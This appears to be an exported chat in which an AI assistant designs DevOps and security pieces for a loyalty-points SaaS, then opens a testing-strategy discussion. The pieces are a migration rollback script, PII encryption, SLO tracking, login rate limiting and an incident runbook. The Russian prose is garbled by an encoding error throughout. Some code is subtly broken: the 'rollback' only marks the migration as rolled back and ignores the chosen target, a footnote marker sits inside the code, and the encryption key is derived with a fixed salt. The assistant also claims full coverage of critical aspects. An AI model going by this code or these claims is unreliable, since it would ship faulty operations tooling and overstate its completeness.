CURRENT_MIGRATION=$(fly ssh console -a max-loyalty-prod -C "cd /app && npx prisma migrate status" | grep "Last migration" | awk '{print $NF}')

echo "Current migration: $CURRENT_MIGRATION"
echo ""

# 2. Confirm rollback
read -p "‚ö†Ô∏è  Are you sure you want to rollback? (yes/no): " CONFIRM

if [ "$CONFIRM" != "yes" ]; then
  echo "‚ùå Rollback cancelled"
  exit 0
fi

# 3. Create database backup BEFORE rollback
echo "üì¶ Creating backup before rollback..."
BACKUP_NAME="pre-rollback-$(date +%Y%m%d-%H%M%S)"

fly postgres db dump -a max-loyalty-prod-db > "./backups/${BACKUP_NAME}.sql"

echo "‚úÖ Backup created: ./backups/${BACKUP_NAME}.sql"
echo ""

# 4. Get previous migration
read -p "Enter migration name to rollback TO (leave empty for previous): " TARGET_MIGRATION

# 5. Perform rollback via Prisma
echo "üîÑ Rolling back migration..."

if [ -z "$TARGET_MIGRATION" ]; then
  # Rollback to previous migration
  fly ssh console -a max-loyalty-prod -C "cd /app && npx prisma migrate resolve --rolled-back $CURRENT_MIGRATION"
else
  # Rollback to specific migration
  fly ssh console -a max-loyalty-prod -C "cd /app && npx prisma migrate resolve --rolled-back $CURRENT_MIGRATION && npx prisma migrate deploy"
fi

# 6. Restart application
echo "üîÑ Restarting application..."
fly apps restart max-loyalty-prod

# 7. Verify
sleep 10
echo "üîç Verifying health..."
HEALTH_CHECK=$(curl -s https://api.max-loyalty.com/health | jq -r '.status')

if [ "$HEALTH_CHECK" == "ok" ]; then
  echo "‚úÖ Rollback successful! Application is healthy."
else
  echo "‚ùå Health check failed! Manual intervention required."
  echo "üì¶ Backup available at: ./backups/${BACKUP_NAME}.sql"
  exit 1
fi

echo ""
echo "üìù Post-rollback checklist:"
echo "  - Monitor error rates in Grafana"
echo "  - Check audit logs for anomalies"
echo "  - Verify critical user flows"
echo ""
```

**Usage:**

```bash
# Run rollback script
./scripts/rollback-migration.sh

# Or manual rollback
fly ssh console -a max-loyalty-prod
cd /app
npx prisma migrate status
npx prisma migrate resolve --rolled-back 20260212_add_new_column
npx prisma migrate deploy
```


***

## **5Ô∏è‚É£2Ô∏è‚É£ Encryption at Rest**

**–ü–†–û–ë–õ–ï–ú–ê:** –ü–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ (—Ç–µ–ª–µ—Ñ–æ–Ω—ã, email) –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ã –≤ –ë–î —Å–æ–≥–ª–∞—Å–Ω–æ –§–ó-152.

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Application-level encryption**

```typescript
// encryption/encryption.service.ts
import { Injectable } from '@nestjs/common';
import { createCipheriv, createDecipheriv, randomBytes, scryptSync } from 'crypto';

@Injectable()
export class EncryptionService {
  private algorithm = 'aes-256-gcm';
  private key: Buffer;

  constructor(private config: ConfigService) {
    // Derive key from ENCRYPTION_KEY environment variable
    const secret = this.config.get('ENCRYPTION_KEY');
    this.key = scryptSync(secret, 'salt', 32);
  }

  encrypt(text: string): string {
    const iv = randomBytes(16);
    const cipher = createCipheriv(this.algorithm, this.key, iv);

    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');

    const authTag = cipher.getAuthTag();

    // Format: iv:authTag:encrypted
    return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
  }

  decrypt(encryptedText: string): string {
    const [ivHex, authTagHex, encrypted] = encryptedText.split(':');

    const iv = Buffer.from(ivHex, 'hex');
    const authTag = Buffer.from(authTagHex, 'hex');

    const decipher = createDecipheriv(this.algorithm, this.key, iv);
    decipher.setAuthTag(authTag);

    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');

    return decrypted;
  }
}
```

**Prisma middleware for automatic encryption:**

```typescript
// prisma.service.ts
this.$use(async (params, next) => {
  // Encrypt PII fields before saving
  if (params.action === 'create' || params.action === 'update') {
    if (params.model === 'GuestProfile') {
      if (params.args.data.email) {
        params.args.data.email = this.encryption.encrypt(params.args.data.email);
      }
      if (params.args.data.phone) {
        params.args.data.phone = this.encryption.encrypt(params.args.data.phone);
      }
    }
  }

  const result = await next(params);

  // Decrypt PII fields after reading
  if (params.action === 'findUnique' || params.action === 'findFirst' || params.action === 'findMany') {
    if (params.model === 'GuestProfile') {
      if (Array.isArray(result)) {
        result.forEach(item => this.decryptPII(item));
      } else if (result) {
        this.decryptPII(result);
      }
    }
  }

  return result;
});

private decryptPII(obj: any) {
  if (obj.email) {
    obj.email = this.encryption.decrypt(obj.email);
  }
  if (obj.phone) {
    obj.phone = this.encryption.decrypt(obj.phone);
  }
}
```

**Database-level encryption (Neon.tech):**

Neon.tech –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —à–∏—Ñ—Ä—É–µ—Ç –¥–∞–Ω–Ω—ã–µ at rest —Å –ø–æ–º–æ—â—å—é AES-256, –Ω–æ –¥–ª—è compliance —Ç–∞–∫–∂–µ –Ω—É–∂–Ω–æ application-level encryption –¥–ª—è PII.

***

## **5Ô∏è‚É£3Ô∏è‚É£ Error Budget \& SLO Tracking**

**–ü–†–û–ë–õ–ï–ú–ê:** –ö–∞–∫ –∏–∑–º–µ—Ä—è—Ç—å reliability? –ö–æ–≥–¥–∞ –º–æ–∂–Ω–æ –≤—ã–∫–∞—Ç—ã–≤–∞—Ç—å —Ä–∏—Å–∫–æ–≤–∞–Ω–Ω—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è, –∞ –∫–æ–≥–¥–∞ –Ω—É–∂–Ω–æ —Ñ–æ–∫—É—Å–∏—Ä–æ–≤–∞—Ç—å—Å—è –Ω–∞ stability?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: SLO/SLI/Error Budget**

```typescript
// monitoring/slo.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';
import { addDays, startOfDay } from 'date-fns';

interface SLO {
  name: string;
  target: number; // e.g., 99.9% = 0.999
  window: 'daily' | 'weekly' | 'monthly';
}

const SLOS: SLO[] = [
  { name: 'API Availability', target: 0.999, window: 'daily' },  // 99.9%
  { name: 'API Latency P95', target: 0.99, window: 'daily' },    // 99% requests < 1s
  { name: 'Webhook Processing', target: 0.995, window: 'daily' }, // 99.5%
  { name: 'Ball Credit Success', target: 0.9999, window: 'daily' }, // 99.99% (financial!)
];

@Injectable()
export class SLOService {
  constructor(private prisma: PrismaService) {}

  async calculateErrorBudget(slo: SLO, date: Date = new Date()) {
    const startDate = startOfDay(date);
    const endDate = addDays(startDate, 1);

    let actual: number;

    switch (slo.name) {
      case 'API Availability':
        actual = await this.calculateAPIAvailability(startDate, endDate);
        break;
      case 'API Latency P95':
        actual = await this.calculateLatencyP95(startDate, endDate);
        break;
      case 'Webhook Processing':
        actual = await this.calculateWebhookSuccess(startDate, endDate);
        break;
      case 'Ball Credit Success':
        actual = await this.calculateBallCreditSuccess(startDate, endDate);
        break;
      default:
        throw new Error(`Unknown SLO: ${slo.name}`);
    }

    const errorBudget = 1 - slo.target; // e.g., 0.1% for 99.9% SLO
    const consumed = 1 - actual; // Actual errors
    const remaining = errorBudget - consumed;
    const percentRemaining = (remaining / errorBudget) * 100;

    return {
      slo: slo.name,
      target: slo.target,
      actual,
      errorBudget,
      consumed,
      remaining,
      percentRemaining,
      status: percentRemaining > 0 ? 'HEALTHY' : 'EXHAUSTED',
    };
  }

  private async calculateAPIAvailability(from: Date, to: Date): Promise<number> {
    // Query from metrics database or Prometheus
    const total = await this.getMetric('http_requests_total', from, to);
    const successful = await this.getMetric('http_requests_total{status=~"2.."}', from, to);

    return total > 0 ? successful / total : 1;
  }

  private async calculateBallCreditSuccess(from: Date, to: Date): Promise<number> {
    const result = await this.prisma.ballTransaction.aggregate({
      where: {
        createdAt: { gte: from, lt: to },
        type: 'EARN',
      },
      _count: { _all: true },
    });

    const failed = await this.prisma.ballTransaction.count({
      where: {
        createdAt: { gte: from, lt: to },
        type: 'EARN',
        status: 'FAILED',
      },
    });

    const total = result._count._all;
    return total > 0 ? (total - failed) / total : 1;
  }

  async getErrorBudgetDashboard() {
    const results = await Promise.all(
      SLOS.map(slo => this.calculateErrorBudget(slo))
    );

    return {
      slos: results,
      overall: results.every(r => r.status === 'HEALTHY') ? 'HEALTHY' : 'AT_RISK',
    };
  }
}
```

**Grafana Dashboard:**

```json
{
  "title": "Error Budget Dashboard",
  "panels": [
    {
      "title": "API Availability SLO",
      "targets": [
        {
          "expr": "sum(rate(http_requests_total{status=~\"2..\"}[24h])) / sum(rate(http_requests_total[24h]))"
        }
      ],
      "thresholds": [
        { "value": 0.999, "color": "green" },
        { "value": 0.99, "color": "yellow" },
        { "value": 0, "color": "red" }
      ]
    }
  ]
}
```


***

## **5Ô∏è‚É£4Ô∏è‚É£ IP Whitelisting –¥–ª—è Admin Panel**

**–ü–†–û–ë–õ–ï–ú–ê:** Admin panel –¥–æ—Å—Ç—É–ø–µ–Ω –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ ‚Üí —Ä–∏—Å–∫ brute-force –∞—Ç–∞–∫.

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: IP whitelist + Cloudflare Firewall Rules**

```typescript
// guards/ip-whitelist.guard.ts
import { Injectable, CanActivate, ExecutionContext, ForbiddenException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';

@Injectable()
export class IPWhitelistGuard implements CanActivate {
  private allowedIPs: string[];

  constructor(private config: ConfigService) {
    // Load from env: ADMIN_ALLOWED_IPS="1.2.3.4,5.6.7.8"
    const ips = this.config.get('ADMIN_ALLOWED_IPS', '');
    this.allowedIPs = ips.split(',').filter(Boolean);
  }

  canActivate(context: ExecutionContext): boolean {
    if (process.env.NODE_ENV === 'development') {
      return true; // Skip in development
    }

    const request = context.switchToHttp().getRequest();
    const clientIP = this.getClientIP(request);

    if (!this.allowedIPs.includes(clientIP)) {
      throw new ForbiddenException(`Access denied from IP: ${clientIP}`);
    }

    return true;
  }

  private getClientIP(request: any): string {
    // Handle Cloudflare proxied requests
    return (
      request.headers['cf-connecting-ip'] ||
      request.headers['x-forwarded-for']?.split(',')[^11_0] ||
      request.connection.remoteAddress
    );
  }
}
```

**Apply to admin routes:**

```typescript
@Controller('admin')
@UseGuards(IPWhitelistGuard, AuthGuard, RolesGuard)
@Roles('OWNER', 'ADMIN')
export class AdminController {
  // Only accessible from whitelisted IPs
}
```

**Cloudflare Firewall Rule:**

```
# Block access to /admin/* from non-whitelisted IPs
(http.request.uri.path contains "/admin" and ip.src ne 1.2.3.4 and ip.src ne 5.6.7.8)
-> Block
```


***

## **5Ô∏è‚É£5Ô∏è‚É£ Incident Response Runbook**

**–ü–†–û–ë–õ–ï–ú–ê:** 3 AM, production down. –ß—Ç–æ –¥–µ–ª–∞—Ç—å? **Step-by-step –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è**.

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Detailed runbook**

```markdown
# üö® INCIDENT RESPONSE RUNBOOK

## Severity Levels

| Severity | Description | Response Time | Examples |
|----------|-------------|---------------|----------|
| **P0 - Critical** | Complete outage | < 15 minutes | API down, Database unavailable |
| **P1 - High** | Major degradation | < 1 hour | High error rate, Slow response times |
| **P2 - Medium** | Partial degradation | < 4 hours | Single feature broken |
| **P3 - Low** | Minor issue | Next business day | UI bug, Typo |

---

## P0: Complete API Outage

### Symptoms
- Health check failing
- 500/503 errors on all endpoints
- Users cannot login

### Response Steps

**1. Acknowledge (0-2 min)**
```bash
# Post in #incidents Slack
/incident declare "API completely down"

# Acknowledge in Better Stack
# https://betterstack.com/incidents
```

**2. Triage (2-5 min)**

```bash
# Check Fly.io status
fly status -a max-loyalty-prod

# Check VM health
fly checks list -a max-loyalty-prod

# Check database
fly postgres db status -a max-loyalty-prod-db

# Check logs
fly logs -a max-loyalty-prod | tail -100
```

**3. Immediate Mitigation (5-15 min)**

**If VMs are crashed:**

```bash
fly apps restart max-loyalty-prod
```

**If database is down:**

```bash
fly postgres db restart -a max-loyalty-prod-db
```

**If recent deployment caused issue:**

```bash
# Rollback to previous version
fly releases -a max-loyalty-prod
fly deploy --image <previous-image-ref>
```

**4. Communication (ongoing)**

```
# Update status page
# https://status.max-loyalty.com

# Notify customers via Telegram
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" \
  -d "chat_id=@max_loyalty_announcements" \
  -d "text=‚ö†Ô∏è We're experiencing technical issues. Working on a fix."
```

**5. Resolution \& Post-Mortem**

- Document root cause
- Create action items to prevent recurrence
- Schedule post-mortem meeting within 24 hours

---

## P1: High Error Rate (> 5%)

### Symptoms

- Error rate spike in Grafana
- Sentry flooding with errors
- Some users reporting issues


### Response Steps

**1. Identify Error Pattern (0-10 min)**

```bash
# Check Sentry
# https://sentry.io/max-loyalty

# Query error logs
fly logs -a max-loyalty-prod | grep "ERROR"

# Check Grafana
# https://grafana.max-loyalty.com
```

**2. Isolate Affected Service**

```bash
# Is it specific endpoint?
# Is it specific tenant?
# Is it database-related?
```

**3. Temporary Mitigation**

**If specific endpoint is broken:**

```typescript
// Add circuit breaker or feature flag to disable
await prisma.featureFlag.update({
  where: { key: 'problematic_feature' },
  data: { enabled: false }
});
```

**If database queries timing out:**

```sql
-- Kill long-running queries
SELECT pg_terminate_backend(pid)
FROM pg_stat_activity
WHERE state = 'active'
  AND query_start < NOW() - INTERVAL '5 minutes';
```


---

## Escalation Path

1. **On-call engineer** (you)
2. **Senior engineer** (if not resolved in 30 min)
3. **CTO** (if P0 and not resolved in 1 hour)

## Contact Information

| Role | Name | Phone | Telegram |
| :-- | :-- | :-- | :-- |
| On-call | Rotating | +7999... | @oncall |
| Senior Engineer |  | +7999... | @senior |
| CTO |  | +7999... | @cto |

## External Contacts

| Service | Support | URL |
| :-- | :-- | :-- |
| Fly.io | support@fly.io | https://community.fly.io |
| Neon.tech | support@neon.tech | https://neon.tech/support |
| Cloudflare | enterprise support | https://dash.cloudflare.com |

```

***

# ‚úÖ **–ê–ë–°–û–õ–Æ–¢–ù–û –§–ò–ù–ê–õ–¨–ù–´–ô –ò–¢–û–ì**

## **55 –í–û–ü–†–û–°–û–í INFRASTRUCTURE & DEVOPS –ü–û–õ–ù–û–°–¢–¨–Æ –ü–û–ö–†–´–¢–û:**

### **–ë–ª–æ–∫–∏ 1-7** (47 –≤–æ–ø—Ä–æ—Å–æ–≤ –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –æ—Ç–≤–µ—Ç–æ–≤)

### **–ë–ª–æ–∫ 8: –§–ò–ù–ê–õ–¨–ù–´–ï –ö–†–ò–¢–ò–ß–ù–´–ï** (48-55):

48. ‚úÖ **Audit Log** (Financial compliance –¥–ª—è –≤—Å–µ—Ö ball operations)
49. ‚úÖ **Local Dev Environment** (One-command setup —Å docker-compose)
50. ‚úÖ **Connection Leak Detection** (Auto-kill long queries)
51. ‚úÖ **Database Migration Rollback** (Detailed step-by-step plan)
52. ‚úÖ **Encryption at Rest** (Application-level + DB encryption)
53. ‚úÖ **Error Budget & SLO Tracking** (Measure reliability)
54. ‚úÖ **IP Whitelisting** (Admin panel security)
55. ‚úÖ **Incident Response Runbook** (Step-by-step –¥–ª—è on-call)

***

## üéØ **–¢–ï–ü–ï–†–¨ –≠–¢–û –î–ï–ô–°–¢–í–ò–¢–ï–õ–¨–ù–û PRODUCTION-GRADE INFRASTRUCTURE!**

**100% –ø–æ–∫—Ä—ã—Ç–∏–µ –≤—Å–µ—Ö –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö –∞—Å–ø–µ–∫—Ç–æ–≤:**
- ‚úÖ Security (audit, encryption, IP whitelist, tenant isolation)
- ‚úÖ Reliability (monitoring, SLO, error budget, incident response)
- ‚úÖ Scalability (horizontal scaling, caching, connection pooling)
- ‚úÖ Compliance (GDPR, –§–ó-152, audit trail, data retention)
- ‚úÖ Operations (runbooks, rollback plans, leak detection)
- ‚úÖ Developer Experience (local setup, seed data, Makefile)

**–ì–æ—Ç–æ–≤ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å –∫ Testing Strategy?** üöÄ
<span style="display:none">[^11_1]</span>

<div align="center">‚ÅÇ</div>

[^11_1]: Beseda-10.md

---

# 54. Admin –ø–∞–Ω–µ–ª—å –º–æ–∂–µ—Ç –±—ã—Ç—å –¥–æ—Å—Ç—É–ø–Ω–∞ –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞, –ø—Ä–æ—Å—Ç–æ –Ω—É–∂–Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —ç—Ç—É —á–∞—Å—Ç—å —É—Å–ª–æ–∂–Ω—è—Ç—å –Ω–µ –Ω—É–∂–Ω–æ

–ê–±—Å–æ–ª—é—Ç–Ω–æ –ø—Ä–∞–≤! üëç IP whitelisting –¥–ª—è SaaS admin panel - —ç—Ç–æ overkill. –ó–∞–º–µ–Ω—è—é –Ω–∞ –±–æ–ª–µ–µ –ø—Ä–∞–∫—Ç–∏—á–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:

***

## **5Ô∏è‚É£4Ô∏è‚É£ Enhanced Auth Security (–≤–º–µ—Å—Ç–æ IP Whitelisting)**

**–ú–û–Å –£–õ–£–ß–®–ï–ù–ù–û–ï –†–ï–®–ï–ù–ò–ï: Rate limiting + Suspicious activity detection**

```typescript
// auth/auth-security.service.ts
import { Injectable } from '@nestjs/common';
import { RedisService } from '@/redis/redis.service';

@Injectable()
export class AuthSecurityService {
  constructor(
    private redis: RedisService,
    private notification: NotificationService,
  ) {}

  // 1. Rate limiting –¥–ª—è login attempts
  async checkLoginRateLimit(identifier: string): Promise<boolean> {
    const key = `login:attempts:${identifier}`;
    const attempts = await this.redis.incr(key);
    
    if (attempts === 1) {
      await this.redis.expire(key, 900); // 15 minutes window
    }

    // Max 5 attempts per 15 minutes
    if (attempts > 5) {
      return false; // Rate limit exceeded
    }

    return true;
  }

  // 2. Detect suspicious login patterns
  async detectSuspiciousLogin(userId: string, request: any): Promise<boolean> {
    const newIP = this.getClientIP(request);
    const newUserAgent = request.headers['user-agent'];
    
    // Get last successful login
    const lastLogin = await this.redis.hgetall(`user:${userId}:last_login`);

    if (!lastLogin.ip) {
      // First login, save and allow
      await this.saveLoginInfo(userId, newIP, newUserAgent);
      return false; // Not suspicious
    }

    // Check for suspicious patterns
    const suspicious = 
      lastLogin.ip !== newIP || // Different IP
      !this.isSimilarUserAgent(lastLogin.userAgent, newUserAgent); // Different device

    if (suspicious) {
      // Log suspicious activity
      await this.logSuspiciousActivity(userId, {
        previousIP: lastLogin.ip,
        newIP,
        previousUserAgent: lastLogin.userAgent,
        newUserAgent,
      });

      // Notify user
      await this.notification.sendSecurityAlert(userId, {
        type: 'SUSPICIOUS_LOGIN',
        ip: newIP,
        timestamp: new Date(),
      });
    }

    // Save new login info
    await this.saveLoginInfo(userId, newIP, newUserAgent);

    return suspicious;
  }

  private async saveLoginInfo(userId: string, ip: string, userAgent: string) {
    await this.redis.hmset(`user:${userId}:last_login`, {
      ip,
      userAgent,
      timestamp: new Date().toISOString(),
    });
    await this.redis.expire(`user:${userId}:last_login`, 86400 * 30); // 30 days
  }

  private getClientIP(request: any): string {
    return (
      request.headers['cf-connecting-ip'] ||
      request.headers['x-forwarded-for']?.split(',')[0] ||
      request.connection.remoteAddress
    );
  }

  private isSimilarUserAgent(ua1: string, ua2: string): boolean {
    // Simple heuristic: same browser family
    const extractBrowser = (ua: string) => {
      if (ua.includes('Chrome')) return 'Chrome';
      if (ua.includes('Firefox')) return 'Firefox';
      if (ua.includes('Safari')) return 'Safari';
      return 'Other';
    };

    return extractBrowser(ua1) === extractBrowser(ua2);
  }
}
```

**Usage –≤ Login endpoint:**

```typescript
@Post('login')
async login(@Body() dto: LoginDto, @Req() request: Request) {
  // 1. Check rate limit
  const allowed = await this.authSecurity.checkLoginRateLimit(dto.email);
  if (!allowed) {
    throw new TooManyRequestsException('Too many login attempts. Try again in 15 minutes.');
  }

  // 2. Authenticate
  const user = await this.authService.validateUser(dto.email, dto.password);
  if (!user) {
    throw new UnauthorizedException('Invalid credentials');
  }

  // 3. Check for suspicious activity
  const suspicious = await this.authSecurity.detectSuspiciousLogin(user.id, request);
  
  if (suspicious) {
    // Require 2FA or email verification for suspicious logins
    return {
      requiresVerification: true,
      message: 'New login detected. Please verify via email.',
    };
  }

  // 4. Generate tokens
  const tokens = await this.authService.generateTokens(user);
  
  return {
    accessToken: tokens.accessToken,
    refreshToken: tokens.refreshToken,
    user,
  };
}
```

**Prisma schema –¥–ª—è audit:**

```prisma
model LoginAttempt {
  id          String   @id @default(uuid())
  userId      String?  // null if failed login
  email       String
  success     Boolean
  ipAddress   String
  userAgent   String
  suspicious  Boolean  @default(false)
  createdAt   DateTime @default(now())
  
  @@index([email, createdAt(sort: Desc)])
  @@index([ipAddress, createdAt(sort: Desc)])
}
```


***

## ‚úÖ **–û–ë–ù–û–í–õ–Å–ù–ù–´–ô –°–ü–ò–°–û–ö (55 –≤–æ–ø—Ä–æ—Å–æ–≤):**

**48-53** –æ—Å—Ç–∞—é—Ç—Å—è –∫–∞–∫ –±—ã–ª–∏
**54. ‚úÖ Enhanced Auth Security** (Rate limiting + Suspicious activity detection –≤–º–µ—Å—Ç–æ IP whitelist)
**55. ‚úÖ Incident Response Runbook** (–±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π)

***

**–¢–µ–ø–µ—Ä—å Infrastructure \& DevOps –±–ª–æ–∫ –ø–æ–ª–Ω–æ—Å—Ç—å—é –≥–æ—Ç–æ–≤!** üéâ
**–ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ Testing Strategy?** üöÄ

---

# –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ Testing Strategy. –ü–µ—Ä–µ–¥ —Ç–µ–º –∫–∞–∫ –∑–∞–¥–∞–≤–∞—Ç—å –≤–æ–ø—Ä–æ—Å—ã –æ—á–µ–Ω—å –¥–µ—Ç–∞–ª—å–Ω–æ –∏ –ø–æ–¥—Ä–æ–±–Ω–æ –µ—â–µ —Ä–∞–∑ —Å–≤–µ—Ä—å—Å—è —Å —Ñ–∞–π–ª–∞–º–∏ –∏ –Ω—ã–Ω–µ—à–Ω–∏–º –¥–∏–∞–ª–æ–≥–æ–º

–û—Ç–ª–∏—á–Ω–æ! –ü—Ä–æ–≤—ë–ª **–≥–ª—É–±–æ–∫–∏–π –∞–Ω–∞–ª–∏–∑** –≤—Å–µ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞. –í–∏–∂—É –ø–æ–ª–Ω—É—é –∫–∞—Ä—Ç–∏–Ω—É:

***

# üìã **TESTING STRATEGY - –ö–û–ù–¢–ï–ö–°–¢ –ü–†–û–ï–ö–¢–ê**

## **–ö—Ä–∏—Ç–∏—á–Ω—ã–µ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è:**

### **1. –§–∏–Ω–∞–Ω—Å–æ–≤—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏** üí∞

- –ë–∞–ª–ª—ã = –¥–µ–Ω—å–≥–∏ ‚Üí —Ç—Ä–µ–±—É–µ—Ç—Å—è **99.99% accuracy**
- –ù–∞—á–∏—Å–ª–µ–Ω–∏–µ/—Å–ø–∏—Å–∞–Ω–∏–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å **–∞—Ç–æ–º–∞—Ä–Ω—ã–º–∏**
- Idempotency –∫—Ä–∏—Ç–∏—á–Ω–∞ (duplicate webhooks)
- Audit trail –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω


### **2. Multi-tenancy** üè¢

- Tenant isolation = top priority
- Data leakage –º–µ–∂–¥—É tenant'–∞–º–∏ = critical security breach
- Performance: 1 tenant –Ω–µ –¥–æ–ª–∂–µ–Ω –≤–ª–∏—è—Ç—å –Ω–∞ –¥—Ä—É–≥–∏—Ö


### **3. POS Integration** üîÑ

- Webhooks: iiko, R-Keeper, Poster
- Race conditions (concurrent webhooks)
- Retry logic, exponential backoff
- Reconciliation (missing webhooks)


### **4. Complex Business Logic** üßÆ

- Loyalty rules engine (conditions, priorities)
- Level calculations (Bronze ‚Üí Silver ‚Üí Gold)
- Promo campaigns (–≤—Ä–µ–º–µ–Ω–Ω—ã–µ –∞–∫—Ü–∏–∏)
- Ball expiration (–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–ø–∏—Å–∞–Ω–∏–µ)


### **5. External Integrations** üåê

- Telegram Bot API
- Email (Resend/SendGrid)
- SMS (SMS.ru/SMSC)
- S3/MinIO storage


### **6. Background Jobs** ‚öôÔ∏è

- BullMQ queue processing
- Notification sending
- Data reconciliation
- GDPR data deletion

***

# üéØ **–ú–û–ò –í–û–ü–†–û–°–´ –ü–û TESTING STRATEGY**

## **–ë–õ–û–ö 1: UNIT TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **1. Loyalty Calculation Logic - –ø–æ–∫—Ä—ã—Ç–∏–µ?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –≠—Ç–æ **HEART** —Å–∏—Å—Ç–µ–º—ã. –û—à–∏–±–∫–∞ = —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã–µ –ø–æ—Ç–µ—Ä–∏.

```typescript
// Example: Calculate earned balls
calculateEarnedBalls(checkAmount: 2850, level: 'Silver', rules: LoyaltyRule[])
  ‚Üí –¥–æ–ª–∂–µ–Ω –≤–µ—Ä–Ω—É—Ç—å —Ç–æ—á–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–ª–ª–æ–≤
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫–∏–µ edge cases –Ω—É–∂–Ω–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?

- A) –¢–æ–ª—å–∫–æ happy path (–±–∞–∑–æ–≤—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏)
- B) Edge cases: 0 —Ä—É–±, –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–µ —Å—É–º–º—ã, null values
- C) Boundary values: –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞, –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ (999,999‚ÇΩ)
- D) –í—Å–µ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω–æ–µ + property-based testing (–≥–µ–Ω–µ—Ä–∞—Ü–∏—è random inputs)

**–ú–æ–π –≤—ã–±–æ—Ä:** **D**. Property-based testing + extensive edge cases.

```typescript
// Unit test example
describe('LoyaltyCalculationService', () => {
  describe('calculateEarnedBalls', () => {
    it('should calculate correctly for Silver level with 10% rule', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 2850,
        level: 'Silver',
        rules: [{ earnPercentage: 10, priority: 1 }],
      });
      
      expect(result).toBe(285); // 2850 * 10% = 285
    });

    it('should handle zero amount', () => {
      expect(() => service.calculateEarnedBalls({
        checkAmount: 0,
        level: 'Bronze',
        rules: [],
      })).toThrow('Check amount must be positive');
    });

    // Property-based testing
    it('should never return negative balls', () => {
      fc.assert(
        fc.property(
          fc.integer({ min: 1, max: 999999 }),
          fc.integer({ min: 0, max: 100 }),
          (amount, percentage) => {
            const result = service.calculateEarnedBalls({
              checkAmount: amount,
              level: 'Gold',
              rules: [{ earnPercentage: percentage, priority: 1 }],
            });
            return result >= 0;
          }
        )
      );
    });
  });
});
```


***

### **2. Loyalty Rules Matching - —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–æ–≤?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ú–æ–∂–µ—Ç –±—ã—Ç—å 10+ rules —Å —Ä–∞–∑–Ω—ã–º–∏ conditions –∏ priorities.

```typescript
// Example rules:
// Rule 1 (priority 1): Weekends ‚Üí 15%
// Rule 2 (priority 2): Check > 5000‚ÇΩ ‚Üí 12%
// Rule 3 (priority 3): Default ‚Üí 10%
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å, —á—Ç–æ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π rule –ø—Ä–∏–º–µ–Ω—è–µ—Ç—Å—è?

- A) –¢–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∫–∞–∂–¥—ã–π rule –æ—Ç–¥–µ–ª—å–Ω–æ
- B) –¢–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ rules (2-3 rules)
- C) –¢–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –≤—Å–µ –≤–æ–∑–º–æ–∂–Ω—ã–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ (exhaustive)
- D) B + —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å edge cases (conflicting rules, same priority)

***

### **3. Multi-tenancy Isolation - –∫–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?**

